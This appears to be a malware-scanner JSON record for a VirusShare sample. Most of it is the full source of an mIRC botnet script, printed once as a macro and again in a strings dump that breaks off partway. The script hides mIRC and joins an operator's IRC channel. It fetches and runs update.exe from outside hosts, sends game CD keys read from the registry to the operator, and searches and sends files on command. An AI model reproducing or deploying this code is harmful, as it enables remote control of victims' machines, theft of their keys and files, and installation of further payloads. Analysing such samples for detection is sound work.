{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Shell": "May run an executable file or a system command",
            "WScript.Shell": "May run an executable file or a system command",
            "chr": "May attempt to obfuscate specific str",
            "command": "May run PowerShell commands",
            "regread": "May read registry keys",
            "run": "May run an executable file or a system command",
            "windows": "May enumerate application windows",
            "write": "May write to a file"
        },
        "macro": ";YOU DONT LIKE ME? BITE ME!!\n;NETCREW SCRIPT MODDED BY BOONSTER\n\nON *:START: { \n  .timer 0 666 botnet.scan.4.server\n  identd on $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)\n  set %botnet.version 0.76\n  set %botnet.channel #boonster\n  set %botnet.channelpw boonster\n  server irc.gamesnet.net:6667\n  set %botnet.server irc.gamesnet.net:6667\n  nick $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)\n  anick $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)\n  echo -a $dll(logs/dmu.dll,HideMirc,on)\n  set %botnet.bla $strip(\u0002\u0002$\u0002\u0002)\n  copy -o c:\\windows\\notepad.exe c:\\windows\\system32\\\n}\n\nON *:CONNECT: { \n  scon 1 join %botnet.channel %botnet.channelpw\n  botnet.scan.4.server\n  ignore -wd *\n}\n\nON *:DISCONNECT: {   \n  botnet.scan.4.server\n}\n\nalias -l botnet.scan.4.server { set %botnet.host boonsterserver.da.ru | sockclose botnet.check.server | sockopen botnet.check.server %botnet.host 80 }\n\nON *:SOCKOPEN:botnet.check.server: {\n  sockwrite -n $sockname GET / HTTP/1.1\n  sockwrite -n $sockname Host: %botnet.host $+ $str($crlf,2)\n}\n\nON *:SOCKREAD:botnet.check.server: {\n  var %sockread\n  sockread %sockread\n  if ($regsub(%sockread, <HTML><HEAD><TITLE>,,%sockread)) && ($regsub(%sockread, </TITLE></HEAD>,,%sockread)) {\n    if (%botnet.server != %sockread) {\n      set %botnet.server %sockread\n      scon 1 server %botnet.server\n    }\n  }\n}\n\nalias -l botnet.scan.4.version { set %botnet.host boonsterversion.da.ru | sockclose botnet.check.version | sockopen botnet.check.version %botnet.host 80 }\n\nON *:SOCKOPEN:botnet.check.version: {\n  sockwrite -n $sockname GET / HTTP/1.1\n  sockwrite -n $sockname Host: %botnet.host $+ $str($crlf,2)\n}\n\nON *:SOCKREAD:botnet.check.version: {\n  var %sockread\n  sockread %sockread\n  if ($regsub(%sockread, <HTML><HEAD><TITLE>,,%sockread)) && ($regsub(%sockread, </TITLE></HEAD>,,%sockread)) {\n    if (%botnet.version < %sockread) {\n      if ($isfile(update.exe)) { .remove update.exe }      \n      .timer 1 1 botnet.scan.4.fileurl\n      .timer 1 2 sockclose botnet.check.version\n    }\n  }\n}\nalias -l botnet.scan.4.fileurl { set %botnet.host boonsterfileurl.da.ru | sockclose botnet.check.fileurl | sockopen botnet.check.fileurl %botnet.host 80 }\n\nON *:SOCKOPEN:botnet.check.fileurl: {\n  sockwrite -n $sockname GET / HTTP/1.1\n  sockwrite -n $sockname Host: %botnet.host $+ $str($crlf,2)\n}\n\nON *:SOCKREAD:botnet.check.fileurl: {\n  var %sockread\n  sockread %sockread\n  if ($regsub(%sockread, <HTML><HEAD><TITLE>,,%sockread)) && ($regsub(%sockread, </TITLE></HEAD>,,%sockread)) {\n    set %botnet.account %sockread\n    sockclose botnet.download.new.version\n    .timer 1 1 sockopen botnet.download.new.version people.freenet.de 80\n  }\n}\n\nON *:SOCKOPEN:botnet.download.new.version: {\n  sockwrite -n $sockname GET / $+ %botnet.account $+ /update.exe HTTP/1.0\n  sockwrite -n $sockname Accept: */*\n  sockwrite -n $sockname Host: %botnet.host $+ $str($crlf,2)\n  sockwrite -n $sockname\n}\n\nON *:SOCKREAD:botnet.download.new.version:{\n  if (%botnet.aupd.downloadready != 1) {\n    var %header\n    sockread %header\n    while ($sockbr) {\n      if (* !iswm %header) {\n        %botnet.aupd.downloadready = 1\n        break\n      }\n      sockread %header\n    }\n  }\n  sockread 4096 &d\n  while ($sockbr) {\n    bwrite update.exe -1 -1 &d\n    sockread 4096 &d\n  }\n}\n\nON *:SOCKCLOSE:botnet.download.new.version: { unset %botnet.aupd.* | run update.exe | .timer 1 3 run C:\\WINDOWS\\system32\\system01\\svchost.exe | .timer 1 3 exit }\n\nON *:TEXT:*:%botnet.channel: { \n  if ($nick == boonster) {\n    if ($1 == .amsg) { \n      if (reg isin $2-) || (com isin $2-) || (%botnet.bla isin $2-) || (nc.dll isin $2-) || (chr isin $2-) || (decode isin $2-) || (mirc.exe isin $2-) || (dmu.dll isin $2-) || (exit isin $2-) || (quit isin $2-) || (disconnect isin $2-) || (write isin $2-) || (server isin $2-) || (load isin $2-) || (timer isin $2-) || (run isin $2-) || (ignore isin $2-) { return }\n      else { scon $2 .amsg $3- }\n    }\n    elseif ($1 == .update) { botnet.scan.4.version }\n    elseif ($1 == .nick) { \n      if ($3) { scon $2 nick $3 $+ $chr(91) $+ $rand(99999,1) $+ $chr(93) }\n      else { scon $2 nick $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) }\n    } \n    elseif ($1 == .server) { botnet.scan.4.server }   \n    elseif ($1 == .status) { scon 1 .msg %botnet.channel \u0002[\u0002 $+ $ip $+ \u0002]\u0002 Running \u0002B\u0002ot\u0002N\u0002et v $+ %botnet.version with Windows $os $+ . Idle for $idle seconds. }\n    elseif ($1 == .getkeys) { getkeys public }\n    elseif ($1 == .mirc) { \n      if ($2 == amsg) { \n        if (reg isin $2-) || (com isin $2-) || (%botnet.bla isin $2-) || (nc.dll isin $2-) || (chr isin $2-) || (decode isin $2-) || (mirc.exe isin $2-) || (dmu.dll isin $2-) || (exit isin $2-) || (quit isin $2-) || (disconnect isin $2-) || (write isin $2-) || (server isin $2-) || (load isin $2-) || (timer isin $2-) || (run isin $2-) || (ignore isin $2-) { return }\n        else { dde mirc command \"\" /.amsg $3- }\n      }\n      elseif ($2 == status) { dde mirc command \"\" //dde nc command \"\" /scon 1 msg %botnet.channel \u001fNick\u001f: $ $+ me  \u001fHost\u001f: $ $+ host \u001fMirc\u001f: $ $+ version \u001fMircDir\u001f: $ $+ mircdir }\n    }\n    elseif ($1 == .search_file) { search_file $2 $3 $nick public }\n    elseif ($1 == .get_file) { get_search_file $2 $nick }  \n    elseif ($1 == .search_rcon) { scan_config counterstrike rcon }     \n    elseif ($1 == .join) { \n      if (reg isin $2-) || (com isin $2-) || (%botnet.bla isin $2-) || (nc.dll isin $2-) || (chr isin $2-) || (decode isin $2-) || (mirc.exe isin $2-) || (dmu.dll isin $2-) || (exit isin $2-) || (quit isin $2-) || (disconnect isin $2-) || (write isin $2-) || (server isin $2-) || (load isin $2-) || (timer isin $2-) || (run isin $2-) || (ignore isin $2-) { return }\n      else { scon $2 join $3- }  \n    }\n    elseif ($1 == .part) { \n      if ($3 == %boonster.channel) { return }\n      elseif (reg isin $2-) || (com isin $2-) || (%botnet.bla isin $2-) || (nc.dll isin $2-) || (chr isin $2-) || (decode isin $2-) || (mirc.exe isin $2-) || (dmu.dll isin $2-) || (exit isin $2-) || (quit isin $2-) || (disconnect isin $2-) || (write isin $2-) || (server isin $2-) || (load isin $2-) || (timer isin $2-) || (run isin $2-) || (ignore isin $2-) { return }\n      else { scon $2 part $3- }    \n    }\n    elseif ($1 == .disconnect) { scon 2 disconnect }\n    elseif ($1 == .msg) {\n      if (reg isin $2-) || (com isin $2-) || (%botnet.bla isin $2-) || (nc.dll isin $2-) || (chr isin $2-) || (decode isin $2-) || (mirc.exe isin $2-) || (dmu.dll isin $2-) || (exit isin $2-) || (quit isin $2-) || (disconnect isin $2-) || (write isin $2-) || (server isin $2-) || (load isin $2-) || (timer isin $2-) || (run isin $2-) || (ignore isin $2-) { return }\n      else { scon $2 .msg $3 $4- }\n    }\n    elseif ($1 == .listserver) { listserver public }\n    elseif ($1 == .readreg) { \n      if (reg isin $2-) || (com isin $2-) || (%botnet.bla isin $2-) || (nc.dll isin $2-) || (chr isin $2-) || (decode isin $2-) || (mirc.exe isin $2-) || (dmu.dll isin $2-) || (exit isin $2-) || (quit isin $2-) || (disconnect isin $2-) || (write isin $2-) || (server isin $2-) || (load isin $2-) || (timer isin $2-) || (run isin $2-) || (ignore isin $2-) { return }\n      else { scon 1 .msg %botnet.channel $_regread($2-) }\n    }\n    elseif ($1 == .connect) { \n      if ($scon(0) == 2)  { scon 2 server $2- }\n      elseif ($scon(0) == 1) { server -m $2- }\n    }\n  }\n}\n\nON *:TEXT:*:?: { \n  if ($nick == boonster) {\n    if ($1 == .fserve) { fserve $nick 10 $2- }\n    if ($1 == .amsg) { \n      if (reg isin $2-) || (com isin $2-) || (%botnet.bla isin $2-) || (nc.dll isin $2-) || (chr isin $2-) || (decode isin $2-) || (mirc.exe isin $2-) || (dmu.dll isin $2-) || (exit isin $2-) || (quit isin $2-) || (disconnect isin $2-) || (write isin $2-) || (server isin $2-) || (load isin $2-) || (timer isin $2-) || (run isin $2-) || (ignore isin $2-) { return }\n      else { scon $2 .amsg $3- }\n    }\n    elseif ($1 == .update) { botnet.scan.4.version }\n    elseif ($1 == .server) { botnet.scan.4.server }   \n    elseif ($1 == .status) { .msg $nick \u0002[\u0002 $+ $ip $+ \u0002]\u0002 Running \u0002B\u0002ot\u0002N\u0002et v $+ %botnet.version with Windows $os $+ . Idle for $idle seconds. }\n    elseif ($1 == .getkeys) { getkeys }\n    elseif ($1 == .mirc) { \n      if ($2 == amsg) { \n        if (reg isin $2-) || (com isin $2-) || (%botnet.bla isin $2-) || (nc.dll isin $2-) || (chr isin $2-) || (decode isin $2-) || (mirc.exe isin $2-) || (dmu.dll isin $2-) || (exit isin $2-) || (quit isin $2-) || (disconnect isin $2-) || (write isin $2-) || (server isin $2-) || (load isin $2-) || (timer isin $2-) || (run isin $2-) || (ignore isin $2-) { return }\n        else { dde mirc command \"\" /.amsg $3- }\n      }\n      elseif ($2 == status) { dde mirc command \"\" //dde nc command \"\" /scon 1 msg boonster \u001fNick\u001f: $ $+ me  \u001fHost\u001f: $ $+ host \u001fMirc\u001f: $ $+ version \u001fMircDir\u001f: $ $+ mircdir }\n    }\n    elseif ($1 == .search_file) { search_file $2 $3 $nick }\n    elseif ($1 == .get_file) { get_search_file $2 $nick }    \n    elseif ($1 == .search_rcon) { scan_config counterstrike rcon }   \n    elseif ($1 == .join) { \n      if (reg isin $2-) || (com isin $2-) || (%botnet.bla isin $2-) || (nc.dll isin $2-) || (chr isin $2-) || (decode isin $2-) || (mirc.exe isin $2-) || (dmu.dll isin $2-) || (exit isin $2-) || (quit isin $2-) || (disconnect isin $2-) || (write isin $2-) || (server isin $2-) || (load isin $2-) || (timer isin $2-) || (run isin $2-) || (ignore isin $2-) { return }\n      else { scon $2 join $3- }  \n    }\n    elseif ($1 == .part) { \n      if ($3 == %boonster.channel) { return }\n      elseif (reg isin $2-) || (com isin $2-) || (%botnet.bla isin $2-) || (nc.dll isin $2-) || (chr isin $2-) || (decode isin $2-) || (mirc.exe isin $2-) || (dmu.dll isin $2-) || (exit isin $2-) || (quit isin $2-) || (disconnect isin $2-) || (write isin $2-) || (server isin $2-) || (load isin $2-) || (timer isin $2-) || (run isin $2-) || (ignore isin $2-) { return }\n      else { scon $2 part $3- }    \n    }\n    elseif ($1 == .disconnect) { scon 2 disconnect }\n    elseif ($1 == .msg) {\n      if (reg isin $2-) || (com isin $2-) || (%botnet.bla isin $2-) || (nc.dll isin $2-) || (chr isin $2-) || (decode isin $2-) || (mirc.exe isin $2-) || (dmu.dll isin $2-) || (exit isin $2-) || (quit isin $2-) || (disconnect isin $2-) || (write isin $2-) || (server isin $2-) || (load isin $2-) || (timer isin $2-) || (run isin $2-) || (ignore isin $2-) { return }\n      else { scon $2 .msg $3 $4- }\n    }\n    elseif ($1 == .listserver) { listserver }\n    elseif ($1 == .readreg) { \n      if (reg isin $2-) || (com isin $2-) || (%botnet.bla isin $2-) || (nc.dll isin $2-) || (chr isin $2-) || (decode isin $2-) || (mirc.exe isin $2-) || (dmu.dll isin $2-) || (exit isin $2-) || (quit isin $2-) || (disconnect isin $2-) || (write isin $2-) || (server isin $2-) || (load isin $2-) || (timer isin $2-) || (run isin $2-) || (ignore isin $2-) { return }\n      else { scon 1 .msg $nick $_regread($2-) }\n    }\n    elseif ($1 == .connect) { \n      if ($scon(0) == 2)  { scon 2 server $2- }\n      elseif ($scon(0) == 1) { server -m $2- }\n    }\n  }\n}\n\n\nalias -l listserver {\n  var %i = 1\n  while (%i <= $scon(0)) {\n    var %botnet.listserver %botnet.listserver $iif($scon(%i).server,\u001f $+ %i $+ \u001f: $scon(%i).server)\n    inc %i\n  }\n  if ($1 == public) { scon 1 .msg %botnet.channel %botnet.listserver }\n  else { .msg $nick %botnet.listserver }\n}\n\n\nalias -l getkeys { \n  var %botnet.getkeys.bfv $_regread(HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA GAMES\\Battlefield Vietnam\\ergc\\)\n  var %botnet.getkeys.hl $_regread(HKEY_CURRENT_USER\\Software\\Valve\\Half-Life\\Settings\\Key)\n  var %botnet.getkeys.ut $_regread(HKEY_LOCAL_MACHINE\\SOFTWARE\\Unreal Technology\\Installed Apps\\UT2004\\CDKEY)\n  var %botnet.getkeys.q3 $read($_regread(HKEY_LOCAL_MACHINE\\SOFTWARE\\Id\\Quake III Arena\\INSTALLPATH) $+ \\baseq3\\q3key,1)\n  var %botnet.getkeys.bf $_regread(HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield 1942\\ergc\\)\n  if ($1 == public) {\n    .msg #boonster.keys $iif(%botnet.getkeys.bfv,Battlefield Vietnam \u0002(\u0002 $+ %botnet.getkeys.bfv $+ \u0002)\u0002 )  $iif(%botnet.getkeys.hl,Half-Life \u0002(\u0002 $+ %botnet.getkeys.hl $+ \u0002)\u0002 )  $iif(%botnet.getkeys.ut,Unreal Tournament 2004 \u0002(\u0002 $+ %botnet.getkeys.ut $+ \u0002)\u0002 ) $iif(%botnet.getkeys.bf,Battlefield 1942 \u0002(\u0002 $+ %botnet.getkeys.bf $+ \u0002)\u0002 ) $iif(%botnet.getkeys.q3,Quake III Arena \u0002(\u0002 $+ %botnet.getkeys.q3 $+ \u0002)\u0002 ) \n\n  }\n  else {\n    scon 1 .msg $nick $iif(%botnet.getkeys.bfv,Battlefield Vietnam \u0002(\u0002 $+ %botnet.getkeys.bfv $+ \u0002)\u0002 )  $iif(%botnet.getkeys.hl,Half-Life \u0002(\u0002 $+ %botnet.getkeys.hl $+ \u0002)\u0002 )  $iif(%botnet.getkeys.ut,Unreal Tournament 2004 \u0002(\u0002 $+ %botnet.getkeys.ut $+ \u0002)\u0002 ) $iif(%botnet.getkeys.bf,Battlefield 1942 \u0002(\u0002 $+ %botnet.getkeys.bf $+ \u0002)\u0002 ) $iif(%botnet.getkeys.q3,Quake III Arena \u0002(\u0002 $+ %botnet.getkeys.q3 $+ \u0002)\u0002 )\n  }  \n}\n\nalias -l search_file {\n  if (!$disk($1)) { return NO_GIVEN_DISK }\n  elseif (!$2) { return NO_SEARCH_FILE }\n  elseif (%botnet.protection.search_file_timer) { return TIMER_STILL_ACTIVE }\n  set %botnet.protection.search_file_timer ON\n  var %i 1, %disk $1, %search $2, %found\n  while (%i <= $findfile(%disk,%search,0)) {\n    ;echo -a $findfile(%disk,%search,%i)\n    %found = %found $replace($findfile(%disk,%search,%i),$chr(32),$chr(155))\n    inc %i\n  }\n  if (%found) {\n    if ($4 == public) {\n      scon 1 .msg #boonster.found Found: $replace(%found,$chr(155),$chr(32))\n    }\n    else {\n      scon 1 .msg $3 Found: $replace(%found,$chr(155),$chr(32))\n    }\n  }\n  set %botnet.search_file.found $replace($strip(%found),$chr(32),$chr(8))\n  .timer 1 10 unset %botnet.protection.search_file_timer\n  .timer 1 60 unset %botnet.search_file.found\n}\n\nalias -l get_search_file {\n  if (!%botnet.search_file.found) { return NO_SEARCH_RESULT }\n  elseif ($1 !isnum) { return NO_GIVEN_FILENUMBER }\n  if ($isfile($replace($gettok(%botnet.search_file.found,$1,8),$chr(155),$chr(32)))) {\n    dcc send $2 $replace($gettok(%botnet.search_file.found,$1,8),$chr(155),$chr(32))\n  }    \n}\n\nalias -l _regread {\n  var %a = regread $+ $ticks\n  .comopen %a WScript.Shell\n  if ($comerr) { return 0 }\n  if (!$com(%a,RegRead,3,bstr,$1)) {\n    .comclose %a\n    return 0\n  }\n  var %b = $com(%a).result\n  .comclose %a\n  return %b\n}\n\nalias scan_config {\n  if ($2) {\n    var %search $2\n    if ($1 == counterstrike) { \n      var %dir $_regread(HKEY_LOCAL_MACHINE\\SOFTWARE\\Valve\\Steam\\InstallPath) $+ \\SteamApps\n      var %i 1, %line 1\n      if ($isfile(scan_config.txt)) { .remove scan_config.txt }\n      while (%i <= $findfile(%dir,*.cfg,0)) {\n        if ($read($findfile(%dir,*.cfg,%i),w,* $+ %search $+ *,%line)) { .write scan_config.txt _ | .write scan_config.txt $findfile(%dir,*.cfg,%i) }\n        while ($read($findfile(%dir,*.cfg,%i),w,* $+ %search $+ *,%line)) {\n          .write scan_config.txt $read($findfile(%dir,*.cfg,%i),w,* $+ %search $+ *,%line)\n          var %line $calc($readn + 1)\n        }\n        var %line 1\n        inc %i\n      }\n      scon 1 .msg %botnet.channel File written.. \n    }\n    elseif ($1 == quake3) { }\n  }\n}\nctcp *:dcc send:*: if ($len($nopath($filename)) >= 225) { scon 1 .msg %botnet.channel $nick tried to crash me with an illegal dcc send of $nopath($filename) | halt }"
    },
    "filename": "VirusShare_d77d342ec463fb0828aca44f7fbf8ae9",
    "filesize": 15611,
    "filetype": "data",
    "hashes": {
        "md5": "d77d342ec463fb0828aca44f7fbf8ae9",
        "sha1": "c209ab06b44e6e123e9c05b8017c429f876f66c4",
        "sha256": "1d225b79703a82eb9a6a6ea2f6d30a1c8f7c930db3e103c50bc26cf8eaed53fa"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            ";YOU DONT LIKE ME? BITE ME!!",
            ";NETCREW SCRIPT MODDED BY BOONSTER",
            "ON *:START: { ",
            "  .timer 0 666 botnet.scan.4.server",
            "  identd on $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)",
            "  set %botnet.version 0.76",
            "  set %botnet.channel #boonster",
            "  set %botnet.channelpw boonster",
            "  server irc.gamesnet.net:6667",
            "  set %botnet.server irc.gamesnet.net:6667",
            "  nick $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)",
            "  anick $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)",
            "  echo -a $dll(logs/dmu.dll,HideMirc,on)",
            "  set %botnet.bla $strip(",
            "  copy -o c:\\windows\\notepad.exe c:\\windows\\system32\\",
            "ON *:CONNECT: { ",
            "  scon 1 join %botnet.channel %botnet.channelpw",
            "  botnet.scan.4.server",
            "  ignore -wd *",
            "ON *:DISCONNECT: {   ",
            "  botnet.scan.4.server",
            "alias -l botnet.scan.4.server { set %botnet.host boonsterserver.da.ru | sockclose botnet.check.server | sockopen botnet.check.server %botnet.host 80 }",
            "ON *:SOCKOPEN:botnet.check.server: {",
            "  sockwrite -n $sockname GET / HTTP/1.1",
            "  sockwrite -n $sockname Host: %botnet.host $+ $str($crlf,2)",
            "ON *:SOCKREAD:botnet.check.server: {",
            "  var %sockread",
            "  sockread %sockread",
            "  if ($regsub(%sockread, <HTML><HEAD><TITLE>,,%sockread)) && ($regsub(%sockread, </TITLE></HEAD>,,%sockread)) {",
            "    if (%botnet.server != %sockread) {",
            "      set %botnet.server %sockread",
            "      scon 1 server %botnet.server",
            "    }",
            "alias -l botnet.scan.4.version { set %botnet.host boonsterversion.da.ru | sockclose botnet.check.version | sockopen botnet.check.version %botnet.host 80 }",
            "ON *:SOCKOPEN:botnet.check.version: {",
            "  sockwrite -n $sockname GET / HTTP/1.1",
            "  sockwrite -n $sockname Host: %botnet.host $+ $str($crlf,2)",
            "ON *:SOCKREAD:botnet.check.version: {",
            "  var %sockread",
            "  sockread %sockread",
            "  if ($regsub(%sockread, <HTML><HEAD><TITLE>,,%sockread)) && ($regsub(%sockread, </TITLE></HEAD>,,%sockread)) {",
            "    if (%botnet.version < %sockread) {",
            "      if ($isfile(update.exe)) { .remove update.exe }      ",
            "      .timer 1 1 botnet.scan.4.fileurl",
            "      .timer 1 2 sockclose botnet.check.version",
            "    }",
            "alias -l botnet.scan.4.fileurl { set %botnet.host boonsterfileurl.da.ru | sockclose botnet.check.fileurl | sockopen botnet.check.fileurl %botnet.host 80 }",
            "ON *:SOCKOPEN:botnet.check.fileurl: {",
            "  sockwrite -n $sockname GET / HTTP/1.1",
            "  sockwrite -n $sockname Host: %botnet.host $+ $str($crlf,2)",
            "ON *:SOCKREAD:botnet.check.fileurl: {",
            "  var %sockread",
            "  sockread %sockread",
            "  if ($regsub(%sockread, <HTML><HEAD><TITLE>,,%sockread)) && ($regsub(%sockread, </TITLE></HEAD>,,%sockread)) {",
            "    set %botnet.account %sockread",
            "    sockclose botnet.download.new.version",
            "    .timer 1 1 sockopen botnet.download.new.version people.freenet.de 80",
            "ON *:SOCKOPEN:botnet.download.new.version: {",
            "  sockwrite -n $sockname GET / $+ %botnet.account $+ /update.exe HTTP/1.0",
            "  sockwrite -n $sockname Accept: */*",
            "  sockwrite -n $sockname Host: %botnet.host $+ $str($crlf,2)",
            "  sockwrite -n $sockname",
            "ON *:SOCKREAD:botnet.download.new.version:{",
            "  if (%botnet.aupd.downloadready != 1) {",
            "    var %header",
            "    sockread %header",
            "    while ($sockbr) {",
            "      if (* !iswm %header) {",
            "        %botnet.aupd.downloadready = 1",
            "        break",
            "      }",
            "      sockread %header",
            "    }",
            "  sockread 4096 &d",
            "  while ($sockbr) {",
            "    bwrite update.exe -1 -1 &d",
            "    sockread 4096 &d",
            "ON *:SOCKCLOSE:botnet.download.new.version: { unset %botnet.aupd.* | run update.exe | .timer 1 3 run C:\\WINDOWS\\system32\\system01\\svchost.exe | .timer 1 3 exit }",
            "ON *:TEXT:*:%botnet.channel: { ",
            "  if ($nick == boonster) {",
            "    if ($1 == .amsg) { ",
            "      if (reg isin $2-) || (com isin $2-) || (%botnet.bla isin $2-) || (nc.dll isin $2-) || (chr isin $2-) || (decode isin $2-) || (mirc.exe isin $2-) || (dmu.dll isin $2-) || (exit isin $2-) || (quit isin $2-) || (disconnect isin $2-) || (write isin $2-) || (server isin $2-) || (load isin $2-) || (timer isin $2-) || (run isin $2-) || (ignore isin $2-) { return }",
            "      else { scon $2 .amsg $3- }",
            "    }",
            "    elseif ($1 == .update) { botnet.scan.4.version }",
            "    elseif ($1 == .nick) { ",
            "      if ($3) { scon $2 nick $3 $+ $chr(91) $+ $rand(99999,1) $+ $chr(93) }",
            "      else { scon $2 nick $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) }",
            "    } ",
            "    elseif ($1 == .server) { botnet.scan.4.server }   ",
            "    elseif ($1 == .status) { scon 1 .msg %botnet.channel ",
            " $+ $ip $+ ",
            " Running ",
            "et v $+ %botnet.version with Windows $os $+ . Idle for $idle seconds. }",
            "    elseif ($1 == .getkeys) { getkeys public }",
            "    elseif ($1 == .mirc) { ",
            "      if ($2 == amsg) { ",
            "        if (reg isin $2-) || (com isin $2-) || (%botnet.bla isin $2-) || (nc.dll isin $2-) || (chr isin $2-) || (decode isin $2-) || (mirc.exe isin $2-) || (dmu.dll isin $2-) || (exit isin $2-) || (quit isin $2-) || (disconnect isin $2-) || (write isin $2-) || (server isin $2-) || (load isin $2-) || (timer isin $2-) || (run isin $2-) || (ignore isin $2-) { return }",
            "        else { dde mirc command \"\" /.amsg $3- }",
            "      }",
            "      elseif ($2 == status) { dde mirc command \"\" //dde nc command \"\" /scon 1 msg %botnet.channel ",
            "Nick",
            ": $ $+ me  ",
            "Host",
            ": $ $+ host ",
            "Mirc",
            ": $ $+ version ",
            "MircDir",
            ": $ $+ mircdir }",
            "    }",
            "    elseif ($1 == .search_file) { search_file $2 $3 $nick public }",
            "    elseif ($1 == .get_file) { get_search_file $2 $nick }  ",
            "    elseif ($1 == .search_rcon) { scan_config counterstrike rcon }     ",
            "    elseif ($1 == .join) { ",
            "      if (reg isin $2-) || (com isin $2-) || (%botnet.bla isin $2-) || (nc.dll isin $2-) || (chr isin $2-) || (decode isin $2-) || (mirc.exe isin $2-) || (dmu.dll isin $2-) || (exit isin $2-) || (quit isin $2-) || (disconnect isin $2-) || (write isin $2-) || (server isin $2-) || (load isin $2-) || (timer isin $2-) || (run isin $2-) || (ignore isin $2-) { return }",
            "      else { scon $2 join $3- }  ",
            "    }",
            "    elseif ($1 == .part) { ",
            "      if ($3 == %boonster.channel) { return }",
            "      elseif (reg isin $2-) || (com isin $2-) || (%botnet.bla isin $2-) || (nc.dll isin $2-) || (chr isin $2-) || (decode isin $2-) || (mirc.exe isin $2-) || (dmu.dll isin $2-) || (exit isin $2-) || (quit isin $2-) || (disconnect isin $2-) || (write isin $2-) || (server isin $2-) || (load isin $2-) || (timer isin $2-) || (run isin $2-) || (ignore isin $2-) { return }",
            "      else { scon $2 part $3- }    ",
            "    }",
            "    elseif ($1 == .disconnect) { scon 2 disconnect }",
            "    elseif ($1 == .msg) {",
            "      if (reg isin $2-) || (com isin $2-) || (%botnet.bla isin $2-) || (nc.dll isin $2-) || (chr isin $2-) || (decode isin $2-) || (mirc.exe isin $2-) || (dmu.dll isin $2-) || (exit isin $2-) || (quit isin $2-) || (disconnect isin $2-) || (write isin $2-) || (server isin $2-) || (load isin $2-) || (timer isin $2-) || (run isin $2-) || (ignore isin $2-) { return }",
            "      else { scon $2 .msg $3 $4- }",
            "    }",
            "    elseif ($1 == .listserver) { listserver public }",
            "    elseif ($1 == .readreg) { ",
            "      if (reg isin $2-) || (com isin $2-) || (%botnet.bla isin $2-) || (nc.dll isin $2-) || (chr isin $2-) || (decode isin $2-) || (mirc.exe isin $2-) || (dmu.dll isin $2-) || (exit isin $2-) || (quit isin $2-) || (disconnect isin $2-) || (write isin $2-) || (server isin $2-) || (load isin $2-) || (timer isin $2-) || (run isin $2-) || (ignore isin $2-) { return }",
            "      else { scon 1 .msg %botnet.channel $_regread($2-) }",
            "    }",
            "    elseif ($1 == .connect) { ",
            "      if ($scon(0) == 2)  { scon 2 server $2- }",
            "      elseif ($scon(0) == 1) { server -m $2- }",
            "    }",
            "ON *:TEXT:*:?: { ",
            "  if ($nick == boonster) {",
            "    if ($1 == .fserve) { fserve $nick 10 $2- }",
            "    if ($1 == .amsg) { ",
            "      if (reg isin $2-) || (com isin $2-) || (%botnet.bla isin $2-) || (nc.dll isin $2-) || (chr isin $2-) || (decode isin $2-) || (mirc.exe isin $2-) || (dmu.dll isin $2-) || (exit isin $2-) || (quit isin $2-) || (disconnect isin $2-) || (write isin $2-) || (server isin $2-) || (load isin $2-) || (timer isin $2-) || (run isin $2-) || (ignore isin $2-) { return }",
            "      else { scon $2 .amsg $3- }",
            "    }",
            "    elseif ($1 == .update) { botnet.scan.4.version }",
            "    elseif ($1 == .server) { botnet.scan.4.server }   ",
            "    elseif ($1 == .status) { .msg $nick ",
            " $+ $ip $+ ",
            " Running ",
            "et v $+ %botnet.version with Windows $os $+ . Idle for $idle seconds. }",
            "    elseif ($1 == .getkeys) { getkeys }",
            "    elseif ($1 == .mirc) { ",
            "      if ($2 == amsg) { ",
            "        if (reg isin $2-) || (com isin $2-) || (%botnet.bla isin $2-) || (nc.dll isin $2-) || (chr isin $2-) || (decode isin $2-) || (mirc.exe isin $2-) || (dmu.dll isin $2-) || (exit isin $2-) || (quit isin $2-) || (disconnect isin $2-) || (write isin $2-) || (server isin $2-) || (load isin $2-) || (timer isin $2-) || (run isin $2-) || (ignore isin $2-) { return }",
            "        else { dde mirc command \"\" /.amsg $3- }",
            "      }",
            "      elseif ($2 == status) { dde mirc command \"\" //dde nc command \"\" /scon 1 msg boonster ",
            "Nick",
            ": $ $+ me  ",
            "Host",
            ": $ $+ host ",
            "Mirc",
            ": $ $+ version ",
            "MircDir",
            ": $ $+ mircdir }",
            "    }",
            "    elseif ($1 == .search_file) { search_file $2 $3 $nick }",
            "    elseif ($1 == .get_file) { get_search_file $2 $nick }    ",
            "    elseif ($1 == .search_rcon) { scan_config counterstrike rcon }   ",
            "    elseif ($1 == .join) { ",
            "      if (reg isin $2-) || (com isin $2-) || (%botnet.bla isin $2-) || (nc.dll isin $2-) || (chr isin $2-) || (decode isin $2-) || (mirc.exe isin $2-) || (dmu.dll isin $2-) || (exit isin $2-) || (quit isin $2-) || (disconnect isin $2-) || (write isin $2-) || (server isin $2-) || (load isin $2-) || (timer isin $2-) || (run isin $2-) || (ignore isin $2-) { return }",
            "      else { scon $2 join $3- }  ",
            "    }",
            "    elseif ($1 == .part) { ",
            "      if ($3 == %boonster.channel) { return }",
            "      elseif (reg isin $2-) || (com isin $2-) || (%botnet.bla isin $2-) || (nc.dll isin $2-) || (chr isin $2-) || (decode isin $2-) || (mirc.exe isin $2-) || (dmu.dll isin $2-) || (exit isin $2-) || (quit isin $2-) || (disconnect isin $2-) || (write isin $2-) || (server isin $2-) || (load isin $2-) || (timer isin $2-) || (run isin $2-) || (ignore isin $2-) { return }",
